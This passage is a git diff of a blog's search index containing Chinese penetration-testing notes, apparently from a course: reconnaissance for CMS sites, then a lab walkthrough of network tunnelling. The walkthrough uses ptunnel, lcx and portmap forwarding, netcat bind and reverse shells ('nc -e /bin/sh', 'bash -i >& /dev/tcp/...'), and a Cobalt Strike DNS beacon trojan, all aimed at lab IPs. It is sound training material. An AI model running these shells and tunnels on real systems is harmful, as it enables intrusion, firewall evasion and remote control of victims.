-<p>内容管理系统（content management system，CMS）是一种位于WEB 前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、Intranet以及Extranet网站的信息。</p>
-<p>内容管理还可选地提供内容抓取工具，将第三方信息来源，比如将文本文件、HTML网页、Web服务、关系数据库等的内容自动抓取，并经分析处理后放到自身的内容库中。</p>
-<p>随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端。</p>
-<h2 id="站点搭建"><a href="#站点搭建" class="headerlink" title="站点搭建"></a>站点搭建</h2><h3 id="目录站点"><a href="#目录站点" class="headerlink" title="目录站点"></a>目录站点</h3><p>/bbs/    论坛</p>
-<h3 id="端口站点"><a href="#端口站点" class="headerlink" title="端口站点"></a>端口站点</h3><p>:8080</p>
-<p>通过开放的端口，分析站点开启了哪些服务</p>
-<h3 id="子域名站点"><a href="#子域名站点" class="headerlink" title="子域名站点"></a>子域名站点</h3><p>同一ip：</p>
-<p><strong>bbs</strong>.goodlift.net</p>
-<p><strong>www</strong>.goodlift.net</p>
-<p>不同ip：</p>
-<p><a href="http://www.etiantian.com/">www.etiantian.com</a></p>
-<p>web.etiantian.com</p>
-<h3 id="类似域名站点"><a href="#类似域名站点" class="headerlink" title="类似域名站点"></a>类似域名站点</h3><h3 id="旁注，C段站点"><a href="#旁注，C段站点" class="headerlink" title="旁注，C段站点"></a>旁注，C段站点</h3><h4 id="旁注：同服务器不同站点"><a href="#旁注：同服务器不同站点" class="headerlink" title="旁注：同服务器不同站点"></a>旁注：同服务器不同站点</h4><p>前提条件：该服务器有多个站点</p>
-<p>例如：192.168.1.100</p>
-<p>​            <a href="http://www.a.com/">www.a.com</a></p>
-<p>​            <a href="http://www.b.com/">www.b.com</a></p>
-<p>可以通过找到b的漏洞来攻击a站点</p>
-<h4 id="C段：同网段不同服务器不同站点（困难）"><a href="#C段：同网段不同服务器不同站点（困难）" class="headerlink" title="C段：同网段不同服务器不同站点（困难）"></a>C段：同网段不同服务器不同站点（困难）</h4><p>前提条件：独立站点服务器，该服务器只有一个站点利用</p>
-<p>例如：192.168.1.100</p>
-<p>​            <a href="http://www.a.com/">www.a.com</a></p>
-<p>​            </p>
-<p>例如：192.168.1.101</p>
-<p>​            <a href="http://www.b.com/">www.b.com</a></p>
-<p>​            </p>
-<h3 id="搭建软件特征站点"><a href="#搭建软件特征站点" class="headerlink" title="搭建软件特征站点"></a>搭建软件特征站点</h3><p>phpstudy、宝塔等</p>
-<p>shodan（一款黑暗搜索引擎）</p>
-<h2 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h2><p><a href="https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg?_at_=1626861335971">漏了个大洞.zip_免费高速下载|百度网盘-分享无限制 (baidu.com)</a>提取码：0b7b</p>
-<p><a href="http://www.xyaz.cn/">【逍遥安卓模拟器】安卓模拟器电脑版_安卓模拟器哪个好用_逍遥安卓模拟器下载官网 (xyaz.cn)</a></p>
-<h2 id="信息搜集思路"><a href="#信息搜集思路" class="headerlink" title="信息搜集思路"></a>信息搜集思路</h2><p>找到目标域名，用百度、Google搜索suit:+域名，得到</p>
-<h2 id="资产监控"><a href="#资产监控" class="headerlink" title="资产监控"></a>资产监控</h2><p>layer子域名挖掘机 4.2版本</p>
-<p>如果存在CDN，用外网去ping可得到真实ip地址，工具<a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业的 IP 地址库_IPIP.NET</a></p>
-<p>查证书的<a href="https://crt.sh(也涉及一些子域名)/">https://crt.sh（也涉及一些子域名）</a></p>
-<p>查询DNS记录<a href="https://dnsdb.io/zh-cn/">DNSDB</a></p>
-<p><a href="https://sct.ftqq.com/">Server酱·Turbo版 (ftqq.com)</a></p>
-]]></content>
-      <categories>
-        <category>小迪安全-Web渗透测试笔记</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -1981,171 +1990,6 @@ kerberos::ptt 票据文件
 <h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>PsTools：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
 <p>mimikatz：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
 <p>impacket-examples-windows：<a href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></p>
-]]></content>
-      <categories>
-        <category>内网安全</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>内网安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>域横向网络&amp;传输&amp;应用层隧道技术</title>
-    <url>/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&amp;%E4%BC%A0%E8%BE%93&amp;%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220314130404064.png" alt="image-20220314130404064"></p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h3><p>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
-<h3 id="代理和隧道技术的区别"><a href="#代理和隧道技术的区别" class="headerlink" title="代理和隧道技术的区别"></a>代理和隧道技术的区别</h3><p>代理主要解决网络访问通讯问题（从一个内网到另一个内网）</p>
-<p>隧道技术解决在代理基础之上通讯受阻的问题（被防火墙等检测拦截），达到绕过过滤限制等</p>
-<h3 id="隧道技术解决什么"><a href="#隧道技术解决什么" class="headerlink" title="隧道技术解决什么"></a>隧道技术解决什么</h3><p>用单独的通道来传输被拦截的数据</p>
-<p>CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</p>
-<h3 id="常见的隧道技术"><a href="#常见的隧道技术" class="headerlink" title="常见的隧道技术"></a>常见的隧道技术</h3><p>网络层：IPv6隧道、ICMP隧道</p>
-<p>传输层：TCP隧道、UDP隧道、常规端口转发</p>
-<p>应用层：SSH隧道、HTTP/S隧道、DNS隧道</p>
-<h2 id="网络传输应用层检测连通性-检测"><a href="#网络传输应用层检测连通性-检测" class="headerlink" title="网络传输应用层检测连通性-检测"></a>网络传输应用层检测连通性-检测</h2><h3 id="1-TCP协议"><a href="#1-TCP协议" class="headerlink" title="1.TCP协议"></a>1.TCP协议</h3><p>用“瑞士军刀”netcat，执行nc命令：</p>
-<pre><code>nc &lt;IP&gt; &lt;端口&gt;
-</code></pre>
-<h3 id="2-HTTP协议"><a href="#2-HTTP协议" class="headerlink" title="2.HTTP协议"></a>2.HTTP协议</h3><p>用curl工具，执行：</p>
-<pre><code>curl &lt;IP地址:端口&gt;
-</code></pre>
-<p>如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
-<h3 id="3-ICMP协议"><a href="#3-ICMP协议" class="headerlink" title="3.ICMP协议"></a>3.ICMP协议</h3><p>用ping命令，执行：</p>
-<pre><code>ping &lt;IP地址/域名&gt;
-</code></pre>
-<h3 id="4-DNS协议"><a href="#4-DNS协议" class="headerlink" title="4.DNS协议"></a>4.DNS协议</h3><p>检测DNS连通性常用的命令是nslookup和dig</p>
-<p>nslookup是windows自带的DNS探测命令</p>
-<p>dig是linux系统自带的DNS探测命令</p>
-<h2 id="网络ICMP隧道Ptunnel使用-检测，利用"><a href="#网络ICMP隧道Ptunnel使用-检测，利用" class="headerlink" title="网络ICMP隧道Ptunnel使用-检测，利用"></a>网络ICMP隧道Ptunnel使用-检测，利用</h2><p>ptunnel把tcp/udp/sock5流量伪装成icmp流量进行转发</p>
-<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">p <span class="comment">##表示链接icmp隧道另一端的机器IP（目标服务器）</span></span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">lp     表示需要监听的本地tcp端口</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">da <span class="comment">##指定需要转发的机器的IP（即目标内网某一机器的内网IP）</span></span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">dp <span class="comment">##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</span></span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">x <span class="comment">##设置连接的密码</span></span></span><br></pre></td></tr></table></figure>
-
-<h3 id="ptunnel安装"><a href="#ptunnel安装" class="headerlink" title="ptunnel安装"></a>ptunnel安装</h3><p><a href="https://www.cnblogs.com/autopwn/p/14642658.html">https://www.cnblogs.com/autopwn/p/14642658.html</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Centos7下的安装步骤</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装libpcap的依赖环境</span></span><br><span class="line">yum -y install byacc</span><br><span class="line">yum -y install flex bison</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装PingTunnel</span></span><br><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">安装完成之后直接可以执行命令</span><br></pre></td></tr></table></figure>
-
-<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220316001809150.png" alt="image-20220316001809150"></p>
-<p>攻击机kali：192.168.184.128</p>
-<p>中介机webserver：192.168.184.142(可出网)   192.168.22.128(内网)</p>
-<p>目标机DC(windows)：192.168.22.130(内网)</p>
-<h4 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h4><p>中介机开启隧道，密码为123</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ptunnel</span> -x <span class="number">123</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322130944392.png" alt="image-20220322130944392"></p>
-<p>攻击机连接隧道</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ptunnel</span> -p <span class="number">192.168.184.142</span> -lp <span class="number">2333</span> -da <span class="number">192.168.22.130</span> -dp <span class="number">3389</span> -x <span class="number">123</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131219962.png" alt="image-20220322131219962"></p>
-<p>当192.168.184.142（p）收到来自192.168.22.130（da）的3389端口（dp）的数据时，发送到攻击机的1080端口（lp）。反之亦然（在二者之间建立隧道）</p>
-<p>攻击机(kali)使用<code>rdesktop</code>进行远程连接</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rdesktop</span> <span class="number">127.0.0.1</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131505617.png" alt="image-20220322131505617"></p>
-<p>输入用户名密码登录成功</p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131717154.png" alt="image-20220322131717154"></p>
-<h2 id="传输层转发隧道lcx、Portmap使用-检测利用"><a href="#传输层转发隧道lcx、Portmap使用-检测利用" class="headerlink" title="传输层转发隧道lcx、Portmap使用-检测利用"></a>传输层转发隧道lcx、Portmap使用-检测利用</h2><p>Windows：lcx</p>
-<p>Linux：portmap</p>
-<h4 id="windows演示"><a href="#windows演示" class="headerlink" title="windows演示"></a>windows演示</h4><h5 id="在被攻击机上："><a href="#在被攻击机上：" class="headerlink" title="在被攻击机上："></a>在被攻击机上：</h5><pre><code>lcx -slave 跳板机IP 6666 127.0.0.1 3389
-</code></pre>
-<p>将（被攻击机）本地的3389转发到跳板机的6666端口</p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323090734071.png" alt="image-20220323090734071"></p>
-<h5 id="在跳板机上（这里需要在跳板机监听才能接收到数据）："><a href="#在跳板机上（这里需要在跳板机监听才能接收到数据）：" class="headerlink" title="在跳板机上（这里需要在跳板机监听才能接收到数据）："></a>在跳板机上（<strong>这里需要在跳板机监听才能接收到数据</strong>）：</h5><pre><code>lcx -listen 本机端口 映射端口
-
-lcx -listen 6666 7777
-</code></pre>
-<p>监听6666映射到7777</p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323090627017.png" alt="image-20220323090627017"></p>
-<h5 id="在攻击机上（进行远程连接）："><a href="#在攻击机上（进行远程连接）：" class="headerlink" title="在攻击机上（进行远程连接）："></a>在攻击机上（进行远程连接）：</h5><pre><code>rdesktop 跳板机IP:7777
-</code></pre>
-<h2 id="传输层转发隧道Netcat使用-检测，利用，功能"><a href="#传输层转发隧道Netcat使用-检测，利用，功能" class="headerlink" title="传输层转发隧道Netcat使用-检测，利用，功能"></a>传输层转发隧道Netcat使用-检测，利用，功能</h2><h3 id="1-双向连接反弹shell"><a href="#1-双向连接反弹shell" class="headerlink" title="1.双向连接反弹shell"></a>1.双向连接反弹shell</h3><h4 id="正向：攻击连接受害"><a href="#正向：攻击连接受害" class="headerlink" title="正向：攻击连接受害"></a>正向：攻击连接受害</h4><p><strong>受害：</strong></p>
-<pre><code>nc -ldp 1234 -e /bin/sh                                          //linux
-
-nc -ldp 1234 -e c:\windows\system32\cmd.exe    //windows
-</code></pre>
-<p>将命令行界面（shell/cmd）推到1234端</p>
-<p><strong>攻击：</strong></p>
-<pre><code>nc 受害机IP 1234                                          //主动连接
-</code></pre>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323120426682.png" alt="image-20220323120426682"></p>
-<h4 id="反向：受害连接攻击"><a href="#反向：受害连接攻击" class="headerlink" title="反向：受害连接攻击"></a>反向：受害连接攻击</h4><p><strong>攻击：</strong></p>
-<p>监听自己的1234端口</p>
-<pre><code>nc -lvp 1234
-</code></pre>
-<p><strong>受害：</strong></p>
-<pre><code>nc 攻击机IP 1234 -e /bin/sh
-
-nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
-</code></pre>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323120156763.png" alt="image-20220323120156763"></p>
-<h3 id="2-多向连接反弹shell-配合转发-反向-portmap"><a href="#2-多向连接反弹shell-配合转发-反向-portmap" class="headerlink" title="2.多向连接反弹shell-配合转发-反向-portmap"></a>2.多向连接反弹shell-配合转发-<strong>反向</strong>-<strong>portmap</strong></h3><blockquote>
-<p>Target2服务器将自己的cmd反弹到Target1的666端口，Target1使用portmap将本地666端口映射到本地777端口，最后由kali(攻击机)连接Target1的777端口</p>
-</blockquote>
-<h4 id="Target2-Ubuntu"><a href="#Target2-Ubuntu" class="headerlink" title="Target2_Ubuntu"></a>Target2_Ubuntu</h4><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.22.128/6666 &lt;&amp;1
-</code></pre>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190611981.png" alt="image-20220327190611981"></p>
-<h4 id="Target1-CentOS"><a href="#Target1-CentOS" class="headerlink" title="Target1_CentOS"></a>Target1_CentOS</h4><p>把666端口数据转发到777端口</p>
-<pre><code>./portmap -m 1 -p1 6666 -h2 192.168.184.128 -p2 7777
-</code></pre>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190552222.png" alt="image-20220327190552222"></p>
-<h4 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h4><pre><code>nc -lvvp 7777
-</code></pre>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190529559.png" alt="image-20220327190529559"></p>
-<h4 id="portmap使用"><a href="#portmap使用" class="headerlink" title="portmap使用"></a>portmap使用</h4><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">Usage:./portmap -m <span class="function"><span class="keyword">method</span> [-<span class="title">h1</span> <span class="title">host1</span>] -<span class="title">p1</span> <span class="title">port1</span> [-<span class="title">h2</span> <span class="title">host2</span>] -<span class="title">p2</span> <span class="title">port2</span> [-<span class="title">v</span>] [-<span class="title">log</span> <span class="title">filename</span>]</span></span><br><span class="line"><span class="function"> -<span class="title">v</span>:</span> version</span><br><span class="line"> -h1: host1</span><br><span class="line"> -h2: host2</span><br><span class="line"> -p1: port1</span><br><span class="line"> -p2: port2</span><br><span class="line"> -log: log the data</span><br><span class="line"> -m: the action <span class="function"><span class="keyword">method</span> <span class="title">for</span> <span class="title">this</span> <span class="title">tool</span></span></span><br><span class="line"><span class="function"> 1:</span> listen <span class="keyword">on</span> PORT1 <span class="keyword">and</span> connect <span class="keyword">to</span> HOST2:PORT2</span><br><span class="line"> <span class="number">2</span>: listen <span class="keyword">on</span> PORT1 <span class="keyword">and</span> PORT2</span><br><span class="line"> <span class="number">3</span>: connect <span class="keyword">to</span> HOST1:PORT1 <span class="keyword">and</span> HOST2:PORT2</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://blog.csdn.net/LTtiandd/article/details/102903725">https://blog.csdn.net/LTtiandd/article/details/102903725</a></p>
-<h3 id="3-相关netcat主要功能"><a href="#3-相关netcat主要功能" class="headerlink" title="3.相关netcat主要功能"></a>3.相关netcat主要功能</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指纹服务</span></span><br><span class="line">nc -nv 192.168.184.142:xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">nc -v -z 192.168.184.142 1-100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口监听</span></span><br><span class="line">nc -lvp xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件传输</span></span><br><span class="line">nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹Shell（见上）</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="应用层DNS隧道配合CS上线-检测，利用，说明"><a href="#应用层DNS隧道配合CS上线-检测，利用，说明" class="headerlink" title="应用层DNS隧道配合CS上线-检测，利用，说明"></a>应用层DNS隧道配合CS上线-检测，利用，说明</h2><blockquote>
-<p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p>
-</blockquote>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm#_Toc65482740">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm#_Toc65482740</a></p>
-<p><a href="https://www.secpulse.com/archives/124454.html">Cobalt Strike｜Beacon原理浅析</a></p>
-<p><a href="https://www.cnblogs.com/EndlessShw/p/15521355.html">Cobalt Strike DNS Beacon 的使用和原理</a></p>
-<h4 id="什么是Beacon"><a href="#什么是Beacon" class="headerlink" title="什么是Beacon"></a>什么是Beacon</h4><p><strong>Beacon是Cobalt Strike运行在目标主机上的payload</strong>，Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机。它的工作方式与Metasploit Framework Payload类似。在实际渗透过程中，我<strong>们可以将其嵌入到可执行文件、添加到Word文档或者通过利用主机漏洞来传递Beacon</strong>。</p>
-<p>Beacon的功能包括以下几点：</p>
-<ol>
-<li><p>使用HTTP或DNS检查是否有待执行任务</p>
-</li>
-<li><p>可连接到多个C2域名</p>
-</li>
-<li><p>能够在分段传输后自动迁移</p>
-</li>
-<li><p>与Cobalt Strike紧密集成，通过社工、主机漏洞和会话来传递Beacon</p>
-</li>
-</ol>
-<p>Beacon的中文名为信标，像是在网络中告诉我们：“嘿，我是肉鸡，我在这…”。我们可以通过下图来看<strong>Beacon的工作原理</strong>：</p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328155752894.png" alt="image-20220328155752894"></p>
-<h4 id="DNS-Beacon-的工作过程"><a href="#DNS-Beacon-的工作过程" class="headerlink" title="DNS Beacon 的工作过程"></a>DNS Beacon 的工作过程</h4><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328155601467.png" alt="image-20220328155601467"></p>
-<p>当受害者请求域名对应的ip地址时（通过 shell 或者 钓鱼），会从根域名DNS服务器，一级域名DNS服务器，二级域名DNS服务器…依次向下寻找，直到我们的团队服务器，同时充当DNS服务器，将Beacon返回给团队服务器。DNS响应告诉Beacon休眠或者连接到团队服务器来下载任务。<strong>DNS响应同时也告诉Beacon如何从团队服务器下载任务</strong>。</p>
-<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="配置监听器"><a href="#配置监听器" class="headerlink" title="配置监听器"></a>配置监听器</h4><blockquote>
-<p>需要买一个域名修改解析记录如下：</p>
-<p>记录类型-&gt;主机记录-&gt;记录值</p>
-<p>A记录-&gt;cs主机名-&gt;CS服务器IP</p>
-<p>NS记录-&gt;ns1主机名-&gt;A记录地址</p>
-<p>NS记录-&gt;ns2主机名-&gt;A记录地址</p>
-</blockquote>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328220713776.png" alt="image-20220328220713776"></p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327223518224.png" alt="image-20220327223518224"></p>
-<p>这里遇到了坑，创建不了监听器</p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/FWJ7%7D6NY36CFOIL2F5KJM.png" alt="img"></p>
-<p>一直说地址被占用，搞了好久，发现是我VPS的53端口被占用了，关掉就好了</p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328125213095.png" alt="image-20220328125213095"></p>
-<p>很奇怪的是，我和赵师傅都有这个进程，他就能创，我却不能，就很玄学。问了黄师傅说是有些服务有关联性，有的服务运行有优先级啥的，也说不准，只能说盲猜QAQ</p>
-<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><blockquote>
-<p>Windows Executable 　　　　　生成32位或64位的exe和基于服务的exe、DLL等后门程序</p>
-<p>Windows Executable(S)　　　　用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存</p>
-</blockquote>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328143931880.png" alt="image-20220328143931880"></p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328143953671.png" alt="image-20220328143953671"></p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>当受害者主机运行我们的木马后，便会有一个<strong>unknown</strong>主机上线</p>
